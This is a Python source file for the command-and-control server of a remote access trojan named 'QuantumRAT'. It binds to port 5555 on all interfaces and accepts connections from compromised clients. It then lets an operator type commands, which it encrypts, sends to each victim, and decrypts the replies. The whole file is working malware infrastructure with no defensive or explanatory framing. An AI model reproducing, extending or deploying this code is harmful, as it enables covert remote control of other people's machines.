import socket
import threading
import os
from encryption import encrypt, decrypt

HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 5555
clients = []

def handle_client(client_socket):
    """Handles communication with a connected client"""
    while True:
        try:
            command = input("QuantumRAT> ")
            if command.lower() == "exit":
                break
            encrypted_command = encrypt(command)
            client_socket.send(encrypted_command)
            response = client_socket.recv(4096)
            print("Response:", decrypt(response))
        except Exception as e:
            print(f"Error: {e}")
            break

def start_server():
    """Starts the C2 server"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")

    while True:
        client, addr = server.accept()
        clients.append(client)
        print(f"[+] Connection from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()

if __name__ == "__main__":
    start_server()
